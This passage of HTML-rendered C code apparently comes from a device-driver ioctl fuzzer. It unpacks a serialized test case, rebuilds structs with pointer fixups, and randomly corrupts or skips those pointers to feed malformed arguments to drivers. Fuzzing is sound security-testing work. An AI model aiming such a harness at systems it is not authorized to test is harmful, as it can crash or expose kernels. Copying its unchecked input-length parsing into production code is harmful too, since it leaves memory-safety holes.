recv_buf;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;seed = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blob_len_arr, blobs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(&amp;seed, head, 4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head += 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(&amp;ioctl_id, head, 4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head += 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(&amp;num_mappings, head, 4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head += 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(&amp;num_blobs, head, 4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head += 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(&amp;dev_name_len, head, 4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head += 4;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// srand with new seed</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;srand(seed);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* dev name */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dev_name = calloc(dev_name_len+1, sizeof(char));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (dev_name == NULL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Failed to allocate dev_name\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(dev_name, head, dev_name_len);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head += dev_name_len;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* map */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map_entry_t *map = calloc(num_mappings, sizeof(map_entry_t));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (map == NULL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Failed to allocate map\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (num_mappings != 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(map, head, num_mappings*sizeof(map_entry_t));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head += num_mappings*sizeof(map_entry_t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* blobs */</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// first create an array to store the sizes themselves</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len_arr = calloc(num_blobs, sizeof(int));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (len_arr == NULL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Failed to allocate len_arr\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// we&#39;ll also want an array to store our pointers</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr_arr = calloc(num_blobs, sizeof(void *));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (ptr_arr == NULL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Failed to allocate ptr_arr\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// copy the blob sizes into our size_arr</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (j=0; j &lt; num_blobs; j++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(&amp;len_arr[j], head, sizeof(int));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head += sizeof(int);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// we&#39;ll also want memory bufs for all blobs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// now that we have the sizes, allocate all the buffers we need</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (j=0; j &lt; num_blobs; j++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr_arr[j] = calloc(len_arr[j], sizeof(char));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Sizeof(ptr_arr[%d])=%d\n&quot;, j, len_arr[j]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;ptr_arr[%d]=%p\n&quot;, j, ptr_arr[j]);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;just added %p to ptr_arr\n&quot;, ptr_arr[j]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (ptr_arr[j] == NULL) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Failed to allocate a blob store\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// might as well copy the memory over as soon as we allocate the space</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy((char *)ptr_arr[j], head, len_arr[j]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;ptr_arr[%d]=\n&quot;, j);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(i=0;i&lt;len_arr[j];i+=4){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;0x%08x\n&quot;, *(unsigned int *)(ptr_arr[j] + i));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head += len_arr[j];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int num_generics = 0;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// time for pointer fixup</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (i=0; i &lt; num_mappings; i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// get out entry</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map_entry_t entry = map[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// pull out the struct to be fixed up</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char *tmp = ptr_arr[entry.src_id];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// check if this is a struct ptr or just a generic one</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// just a generic one</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (entry.dst_id &lt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 90% chance we fixup the generic</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( (rand() % 10) &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int buf_len = 128;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char *tmp_generic = malloc(buf_len);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(tmp_generic, 0, buf_len);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 95% chance we fill it with data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((rand() % 100) &gt; 95) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if dst_id is &lt; 0, it&#39;s abs value is the element size</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int size = -1 * entry.dst_id;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int weight;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if it&#39;s a char or some float, never choose a &quot;small val&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (size == 1 || size &gt; 8)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;weight = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;weight = default_weight;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (i=0; i &lt; buf_len; i+=size) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gen_rand_val(size, &amp;tmp_generic[i], weight);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;generic_arr[num_generics] = tmp_generic;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(tmp+entry.offset, &amp;tmp_generic, sizeof(void *));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num_generics += 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (num_generics &gt;= 264) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Code a better solution for storing generics\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// a struct ptr, so we have the data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 1 in 400 chance we don&#39;t fixup</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( (rand() % 400) &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// now point it to the correct struct/blob</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// printf(&quot;placing %p, at %p\n&quot;, ptr_arr[entry.dst_id], tmp+entry.offset);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(tmp+entry.offset, &amp;ptr_arr[entry.dst_id], sizeof(void *));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (debug) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;ioctl_id: %d\n&quot;, ioctl_id);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;num_mappings: %d\n&quot;, num_mappings);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;num_blobs: %d\n&quot;, num_blobs);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;dev_name_len: %d\n&quot;, dev_name_len);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;dev_name: %s\n&quot;, dev_name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;data[]: \n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 